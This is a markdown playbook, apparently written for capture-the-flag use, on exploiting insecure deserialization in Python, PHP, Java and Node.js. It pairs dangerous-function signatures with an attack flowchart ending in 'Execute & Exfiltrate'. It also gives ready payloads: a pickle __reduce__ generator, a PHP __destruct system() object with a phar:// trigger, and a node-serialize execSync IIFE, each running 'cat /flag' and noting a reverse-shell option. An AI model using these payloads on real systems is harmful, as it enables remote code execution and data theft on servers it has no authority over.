# Insecure Deserialization Playbook (skills/web/deserialization.md)

## 1. Signatures & Code Patterns

| Platform / Framework | Dangerous Function / Pattern | Indicator in Data |
| :--- | :--- | :--- |
| **Python** | `pickle.loads()`, `_pickle.loads()`, `cPickle.loads()`, `shelve` | Byte `\x80\x03` or `\x80\x04` (base64 `gASV...`) |
| **Python PyYAML** | `yaml.load(input, Loader=yaml.Loader)` / `unsafe_load` | `!!python/object/apply:os.system` |
| **PHP** | `unserialize($input)`, `phar://` stream wrapper | Serialized string: `O:4:"User":2:{s:4:"name";...}` |
| **Java** | `ObjectInputStream.readObject()`, `XMLDecoder` | Hex `AC ED 00 05` (base64 `rO0AB...`) |
| **Node.js** | `node-serialize.unserialize()`, `serialize-javascript` | `{"rce":"_$$ND_FUNC$$_function(){...}()"}` |

---

## 2. Decision Flowchart & Checklist

1. **Identify Serialization Format**: Check byte headers (`rO0AB`, `gASV`, `O:len:...`).
2. **Determine Target Environment**:
   - Python $\rightarrow$ Craft `__reduce__` exploit with `os.system` / `subprocess`.
   - PHP $\rightarrow$ Inspect source code for Magic Methods (`__wakeup`, `__destruct`, `__toString`).
   - Java $\rightarrow$ Generate gadget chain via `ysoserial` (CommonsCollections, Spring, etc.).
   - Node.js $\rightarrow$ Exploit IIFE (Immediately Invoked Function Expression) in `node-serialize`.
3. **Execute & Exfiltrate**: Wrap payload with required encoding (Base64, URL, Hex).

---

## 3. Exploit Snippets & Payloads

### 3.1 Python `pickle` Exploit Generator
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        cmd = "cat /flag"  # or reverse shell command
        return (os.popen, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"[+] Pickle Payload (b64): {payload}")
```

### 3.2 PHP Magic Method & Phar Wrapper
```php
<?php
class Exploit {
    public $cmd = "cat /flag";
    function __destruct() { system($this->cmd); }
}
echo urlencode(serialize(new Exploit()));
// Phar trigger: file_get_contents("phar://uploads/avatar.jpg/test.txt");
?>
```

### 3.3 Node.js `node-serialize` IIFE Exploit
```javascript
var payload = '{"rce":"_$$ND_FUNC$$_function (){ return require(\'child_process\').execSync(\'cat /flag\').toString(); } ()"}';
```
